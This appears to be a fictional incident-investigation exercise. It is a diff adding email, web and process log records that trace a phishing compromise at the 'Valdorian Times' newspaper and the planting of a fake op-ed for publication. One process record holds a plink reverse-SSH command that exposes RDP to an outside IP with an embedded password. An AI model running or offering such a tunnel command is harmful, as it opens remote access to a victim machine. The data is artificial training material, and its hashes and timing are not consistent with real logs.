@@ -1,0 +1,59 @@
+"timestamp": 2024-01-10T08:48:16.000Z,
+"sender": valdorias_best_recruiter@gmail.com,
+"reply_to": valdorias_best_recruiter@gmail.com,
+"recipient": ronnie_mclovin@valdoriantimes.news,
+"subject": [EXTERNAL] Breaking News: We're Hiring! Apply Now for Reporter Roles,
+"verdict": CLEAN,
+"link": https://promotionrecruit.org/share/Editorial_J0b_Openings_2024.docx
+"hostname": A37A-DESKTOP
+"ip_addr": 10.10.0.19
+
+"timestamp": 2024-01-10T08:55:51.000Z,
+"hostname": A37A-DESKTOP,
+"username": romclovin,
+"sha256": 1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252,
+"path": C:\ProgramData\hacktivist_manifesto.ps1,
+"filename": hacktivist_manifesto.ps1,
+"process_name": explorer.exe
+
+"timestamp": 2024-01-10T08:55:07.000Z,
+"method": GET,
+"src_ip": 10.10.0.19,
+"user_agent": Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36,
+"url": https://promotionrecruit.org/share/Editorial_J0b_Openings_2024.docx
+
+"timestamp": 2024-01-11T03:08:12.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 168.57.191.100,
+"process_name": cmd.exe,
+"process_hash": 68c24146c391b8c62cd9309d2898c3ee7c86ee6a3171b35c76cab3dc4b68afe6,
+"hostname": A37A-DESKTOP,
+"username": romclovin
+
+"timestamp": 2024-01-31T09:47:51.000Z,
+"hostname": A37A-DESKTOP,
+"username": romclovin,
+"sha256": 5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"path": C:\Users\romclovin\Downloads\fakestory.docx,
+"filename": fakestory.docx,
+"process_name": edge.exe
+
+"timestamp": 2024-01-31T10:26:20.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": move C:\Users\romclovin\Downloads\fakestory.docx C:\Users\romclovin\Documents\OpEdFinal_to_print.docx,
+"process_name": cmd.exe,
+"process_hash": 24713a1129b719e9af97f7eeab6fb7f9e4aa94f162493a8b4e069df1f03a66da,
+"hostname": A37A-DESKTOP,
+"username": romclovin
+
+"timestamp": 2024-01-31T11:11:12.000Z,
+"sender": ronnie_mclovin@valdoriantimes.news,
+"reply_to": ronnie_mclovin@valdoriantimes.news,
+"recipient": clark_kent@valdoriantimes.news,
+"subject": URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper)),
+"verdict": CLEAN,
+"link": https://sharepoint.valdoriantimes.news/files/rmclovin/2024/OpEdFinal_to_print.docx
+
+
